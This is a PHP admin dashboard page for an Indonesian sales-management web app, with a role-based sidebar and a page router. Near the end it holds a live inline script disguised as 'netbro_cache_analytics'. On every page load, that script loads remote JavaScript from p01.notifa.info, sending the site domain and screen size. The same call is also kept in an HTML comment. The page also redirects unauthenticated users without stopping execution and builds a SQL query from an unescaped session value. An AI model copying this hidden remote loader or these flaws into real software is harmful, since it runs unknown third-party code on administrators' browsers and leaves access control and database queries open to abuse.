<?php
include 'proses/koneksi.php';
include 'proses/function.php';
if (empty($_SESSION['username'])) {
	header("Location:login-page.php");
}

?>

<html lang="en">

<head>
	<meta http-equiv="content-type" content="text/html;charset=UTF-8">


	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Aplikasi Admin Penjualan</title>

	<link href="http://fonts.googleapis.com/css?family=Roboto:300,400,900|Roboto+Mono&display=swap" rel=" stylesheet" type="text/css">

	<link href="assets/css/icons/icomoon/styles.css" rel="stylesheet" type="text/css">
	<link href="assets/css/bootstrap.css" rel="stylesheet" type="text/css">
	<link href="assets/css/core.css" rel="stylesheet" type="text/css">
	<link href="assets/css/components.css" rel="stylesheet" type="text/css">
	<link href="assets/css/colors.css" rel="stylesheet" type="text/css">
	<link href="assets/css/extras/animate.min.css" rel="stylesheet" type="text/css">

	<script type="text/javascript" src="assets/js/plugins/loaders/pace.min.js"></script>
	<script type="text/javascript" src="assets/js/core/libraries/jquery.min.js"></script>
	<script type="text/javascript" src="assets/js/core/libraries/bootstrap.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/loaders/blockui.min.js"></script>

	<script type="text/javascript" src="assets/js/core/libraries/jasny_bootstrap.min.js"></script>

	<script type="text/javascript" src="assets/js/plugins/tables/datatables/datatables.min.js"></script>

	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/pdfmake/pdfmake.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/pdfmake/vfs_fonts.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/tables/datatables/extensions/buttons.min.js"></script>



	<script type="text/javascript" src="assets/js/pages/form_input_groups.js"></script>



	<script type="text/javascript" src="assets/js/plugins/uploaders/fileinput/fileinput.min.js"></script>
	<script type="text/javascript" src="assets/js/pages/uploader_bootstrap.js"></script>
	<script type="text/javascript" src="assets/js/core/libraries/jquery_ui/widgets.min.js"></script>

	<script type="text/javascript" src="assets/js/core/libraries/jquery_ui/globalize/globalize.js"></script>

	<script type="text/javascript" src="assets/js/pages/jqueryui_forms.js"></script>


	<script type="text/javascript" src="assets/js/pages/form_inputs.js"></script>

	<!-- Theme JS files -->

	<script type="text/javascript" src="assets/js/plugins/visualization/d3/d3.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/visualization/c3/c3.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/visualization/d3/d3_tooltip.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/styling/switchery.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/styling/uniform.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/forms/selects/bootstrap_multiselect.js"></script>
	<script type="text/javascript" src="assets/js/plugins/ui/moment/moment.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/pickers/daterangepicker.js"></script>

	<!-- Theme JS files -->



	<script type="text/javascript" src="assets/js/plugins/forms/inputs/touchspin.min.js"></script>

	<!-- Theme JS files -->

	<script type="text/javascript" src="assets/js/plugins/velocity/velocity.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/velocity/velocity.ui.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/buttons/spin.min.js"></script>
	<script type="text/javascript" src="assets/js/plugins/buttons/ladda.min.js"></script>

	<script type="text/javascript" src="assets/js/core/app.js"></script>


	<script type="text/javascript" src="assets/js/pages/ecommerce_orders_history.js"></script>
	<script type="text/javascript" src="assets/js/pages/components_buttons.js"></script>
	<script type="text/javascript" src="assets/js/pages/dashboard.js"></script>






	<script type="text/javascript" src="assets/js/plugins/ui/ripple.min.js"></script>
	<!-- /theme JS files -->

	<!-- <script type="text/javascript" async="" src="http://p01.notifa.info/3fsmd3/request?id=1&amp;enc=9UwkxLgY9&amp;params=4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVPOusGZYLpfqT6nfh03G6uiMlelqeNgEqHjBJuZk8rLOubZXl62Qv6WVJN8lJFcyaPpUV7Tux1oQpB49HrPzqrbwmfy74C8Z5ZzO17ZdkwJqKHjmuY67QlnQVSGgAKFgk8MMrFnR0tmuwR99i9Z9leHD%2bHA9sQcFu5ldJWa3QAdgielop6h6EwgsDQV6p0ieBpjtJ%2fJ5lpuPU%2beD0%2fLbobXvW0MhsudRIzaxrYMno1fCihodfv%2bA6mBClyMDA8i3weP3Ys3%2fwDh8OqvqXYhwCqPPH2zggDpNpvRUa4r26up%2fWRJtW9gcGq8X3Kbhi4vPGUg%2fxkqwEJOorqgkbohJFy94u15LtfYfHasVn%2fNoOLT0q9teNCtdRYThsno2HG3xDS24oj%2bXc8gpLvVeqoAh5eiIx0fOR%2bfzck55jmVvTr%2fZyiMgAFoORGnQIlNvuNvdmz4GHMxeJ0IxMOrI7NtC7lYExrDaym3TOkbq5tXfJ3jHUlBX8Zp1gf5v2J%2f5k8%2fconIoz0i4YAnoP43dPAYvvVJiFz%2bS4thE&amp;idc_r=23096064249&amp;domain=localhost&amp;sw=1366&amp;sh=768"></script> -->
</head>
<!-- <?php //include "page/notif.php"; 
		?> -->

<body class="pace-done">
	<div class="pace  pace-inactive">
		<div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">
			<div class="pace-progress-inner"></div>
		</div>
		<div class="pace-activity"></div>
	</div>

	<!-- Main navbar -->
	<div class="navbar navbar-default header-highlight">
		<div class="navbar-header" style="background-color: #ffff;">
			<a class="navbar-brand" href="index.php">
				<img src="img/user/logoxram.png" alt="" style="height: 190%;margin-top: -3%;">
			</a>

			<ul class="nav navbar-nav visible-xs-block">
				<li>
					<a data-toggle="collapse" data-target="#navbar-mobile" class="legitRipple">
						<i class="icon-tree5"></i>
					</a>
				</li>
				<li>
					<a class="sidebar-mobile-main-toggle legitRipple">
						<i class="icon-paragraph-justify3"></i>
					</a>
				</li>
			</ul>
		</div>

		<div class="navbar-collapse collapse" id="navbar-mobile">
			<ul class="nav navbar-nav">
				<li>
					<a class="sidebar-control sidebar-main-toggle hidden-xs legitRipple">
						<i class="icon-paragraph-justify3"></i>
					</a>
				</li>
			</ul>
			<div class="navbar-right">
				<p class="navbar-text"><?php echo $_SESSION['nama'] ?></p>
				<p class="navbar-text">
					<span class="label bg-success">Online</span>
				</p>

				<ul class="nav navbar-nav">
					<li class="dropdown">
						<a href="#" class="dropdown-toggle legitRipple" data-toggle="modal" data-target="#modal_theme_warning">
							<i class="icon-bell2"></i>
							<span class="visible-xs-inline-block position-right">Activity</span>
							<span class="status-mark border-pink-300"></span>
						</a>
					</li>


				</ul>
			</div>


		</div>
	</div>
	<!-- /main navbar -->
	<!-- Page container -->
	<div class="page-container" style="min-height:412.99999618530273px">
		<!-- Page content -->
		<div class="page-content">
			<!-- Main sidebar -->
			<div class="sidebar sidebar-main">
				<div class="sidebar-content">

					<!-- User menu -->
					<div class="sidebar-user-material">
						<div class="category-content">
							<div class="sidebar-user-material-content">
								<a href="#" class="legitRipple">
									<?php $sql = mysqli_query($conn, "SELECT * FROM user where username='$_SESSION[username]'");
									$row = mysqli_fetch_array($sql);
									?>
									<img src="img/user/<?php echo $row['img']; ?>" class="img-circle img-responsive" alt="">
								</a>
								<h6><?php echo $_SESSION['nama']; ?></h6>

							</div>
						</div>
					</div>
					<!-- /user menu -->
					<!-- Main navigation -->
					<div class="sidebar-category sidebar-category-visible">
						<div class="category-content no-padding">
							<ul class="navigation navigation-main navigation-accordion">

								<!-- Main -->
								<li class="navigation-header">
									<span>Main</span>
									<i class="icon-menu" title="" data-original-title="Main pages"></i>
								</li>
								<li class="">
									<a href="?p=home" class="legitRipple">
										<i class="icon-home4"></i>
										<span>Dashboard</span>
									</a>

								</li>
								<?php if ($_SESSION['status'] != 'manager') { ?>
									<li class="">
										<a href="#" class="has-ul legitRipple">
											<i class="icon-grid"></i>
											<span>Produk</span>
										</a>
										<ul class="hidden-ul" style="display: none;">
											<li>
												<a href="?p=dataproduk" class="legitRipple">Data Produk</a>
											</li>
											<?php if ($_SESSION['status'] != 'mandor') { ?>
												<li>
													<a href="?p=addproduk" class="legitRipple">Tambah Produk</a>
												</li>
											<?php } ?>

										</ul>
									</li>

									<!-- <li class="">
																																																						<a href="?p=databahan" class="legitRipple">
																																																							<i class="icon-cube4"></i>
																																																							<span>Bahan Produksi</span>
																																																						</a>

																																																					</li>
																																																					<?php if ($_SESSION['status'] == 'admin') { ?>
																																																																																																		<li class="">
																																																																																																			<a href="" class="has-ul legitRipple">
																																																																																																				<i class="icon-copy"></i>
																																																																																																				<span>Pre Order</span>

																																																																																																			</a>
																																																																																																			<ul class="hidden-ul" style="display: none;">
																																																																																																				<li>
																																																																																																					<a href="?p=preorder" class="legitRipple">Data Pre Order</a>
																																																																																																				</li>
																																																																																																				<li>
																																																																																																					<a href="?p=addpreorder" class="legitRipple">Tambah Pre Order</a>
																																																																																																				</li>
																																																																																																			</ul>
																																																																																																		</li> -->
										<li class="">
											<a href="" class="has-ul legitRipple">
												<i class="icon-graph"></i>
												<span>Penjualan</span>

											</a>
											<ul class="hidden-ul" style="display: none;">
												<li>
													<a href="?p=datapenjualan" class="legitRipple">Data Penjualan</a>
												</li>
												<li>
													<a href="?p=adddatapenjualan" class="legitRipple">Tambah Data Penjualan</a>
												</li>

											</ul>
										</li>

										<li class="">
											<a href="?p=akun" class="legitRipple">
												<i class="icon-users4"></i>
												<span>Manajemen Akun</span>
											</a>

										</li>
									<?php } ?>
									<?php if ($_SESSION['status'] == 'mandor') { ?>
										<li class="">
											<a href="?p=preorder" class="legitRipple">
												<i class="icon-copy"></i>
												<span>Data Pre Order</span>
											</a>

										</li>
									<?php } ?>
								<?php } ?>
								<?php if ($_SESSION['status'] == 'manager') { ?>
									<li class="">

										<a href="?p=reportpenjualan" class="legitRipple"><i class="icon-graph"></i>Report Penjualan</a>

									</li>

									<li class="">
										<a href="?p=akun" class="legitRipple">
											<i class="icon-user"></i>
											<span>Manajemen Akun</span>
										</a>
									</li>


								<?php } ?>
								<li class="">
									<a href="proses/logout.php" class="legitRipple">
										<i class="icon-switch2	"></i>
										<span>Logout</span>
									</a>
								</li>
							</ul>
						</div>
					</div>
					<!-- /main navigation -->
				</div>
			</div>
			<!-- /main sidebar -->
			<!-- Main content -->
			<div class="content-wrapper">
				<!-- Content area -->
				<div class="content">
					<?php
					$pages_dir = 'page';
					if (!empty($_GET['p'])) {
						$pages = scandir($pages_dir, 0);
						unset($pages[0], $pages[1]);
						$p = $_GET['p'];
						if (in_array($p . '.php', $pages))
							include($pages_dir . '/' . $p . '.php');
						else
							echo 'Halaman tidak ditemukan! :(';
					} else
						include($pages_dir . '/home.php');
					?>
					<!-- Main charts -->
					<!-- /main charts -->
					<!-- Dashboard content -->
					<!-- /dashboard content -->
					<!-- Footer -->
					<div class="footer text-muted">
						© 2022. 
						<a href="#">Muhammad Arif Ramadhani</a>

					</div>
					<!-- /footer -->

				</div>
				<!-- /content area -->

			</div>
			<!-- /main content -->

		</div>
		<!-- /page content -->

	</div>
	<!-- /page container -->

	<script type="text/javascript">
		if (self == top) {
			function netbro_cache_analytics(fn, callback) {
				setTimeout(function() {
					fn();
					callback();
				}, 0);
			}

			function sync(fn) {
				fn();
			}

			function requestCfs() {
				var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
				var idc_glo_r = Math.floor(Math.random() * 99999999999);
				var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
					"4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVPOusGZYLpfqT6nfh03G6uiMlelqeNgEqHjBJuZk8rLOubZXl62Qv6WVJN8lJFcyaPpUV7Tux1oQpB49HrPzqrbwmfy74C8Z5ZzO17ZdkwJqKHjmuY67QlnQVSGgAKFgk8MMrFnR0tmuwR99i9Z9leHD%2bHA9sQcFu5ldJWa3QAdgielop6h6EwgsDQV6p0ieBpjtJ%2fJ5lpuPU%2beD0%2fLbobXvW0MhsudRIzaxrYMno1fCihodfv%2bA6mBClyMDA8i3weP3Ys3%2fwDh8OqvqXYhwCqPPH2zggDpNpvRUa4r26up%2fWRJtW9gcGq8X3Kbhi4vPGUg%2fxkqwEJOorqgkbohJFy94u15LtfYfHasVn%2fNoOLT0q9teNCtdRYThsno2HG3xDS24oj%2bXc8gpLvVeqoAh5eiIx0fOR%2bfzck55jmVvTr%2fZyiMgAFoORGnQIlNvuNvdmz4GHMxeJ0IxMOrI7NtC7lYExrDaym3TOkbq5tXfJ3jHUlBX8Zp1gf5v2J%2f5k8%2fconIoz0i4YAnoP43dPAYvvVJiFz%2bS4thE" +
					"&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
				var bsa = document.createElement('script');
				bsa.type = 'text/javascript';
				bsa.async = true;
				bsa.src = url;
				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
			}
			netbro_cache_analytics(requestCfs, function() {});
		};
	</script>



	<div class="daterangepicker dropdown-menu ltr opensleft">
		<div class="calendars">
			<div class="calendar left">
				<div class="calendar-table"></div>
				<div class="daterangepicker_input">
					<div class="calendar-time" style="display: none;">
						<div></div>
					</div>
				</div>
			</div>
			<div class="calendar right">
				<div class="calendar-table"></div>
				<div class="daterangepicker_input">
					<div class="calendar-time" style="display: none;">
						<div></div>
					</div>
				</div>
			</div>
		</div>
		<div class="ranges">
			<ul>
				<li data-range-key="Today">Today</li>
				<li data-range-key="Yesterday">Yesterday</li>
				<li data-range-key="Last 7 Days">Last 7 Days</li>
				<li data-range-key="Last 30 Days">Last 30 Days</li>
				<li data-range-key="This Month">This Month</li>
				<li data-range-key="Last Month">Last Month</li>
				<li data-range-key="Custom Range">Custom Range</li>
			</ul>
			<div class="daterangepicker-inputs">
				<div class="daterangepicker_input">
					<span class="start-date-label">Start date:</span>
					<input class="form-control" type="text" name="daterangepicker_start" value="">
					<i class="icon-calendar3"></i>
				</div>
				<div class="daterangepicker_input">
					<span class="end-date-label">End date:</span>
					<input class="form-control" type="text" name="daterangepicker_end" value="">
					<i class="icon-calendar3"></i>
				</div>
			</div>
			<div class="range_inputs">
				<button class="applyBtn btn btn-sm btn-small bg-slate-600 btn-block legitRipple" disabled="disabled" type="button">Apply</button>
				<button class="cancelBtn btn btn-sm btn-small btn-default btn-block legitRipple" type="button">Cancel</button>
			</div>
		</div>
	</div>
	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>
	<div class="d3-tip" style="position: absolute; top: 0px; display: none; pointer-events: none; box-sizing: border-box;"></div>

</body>

</html>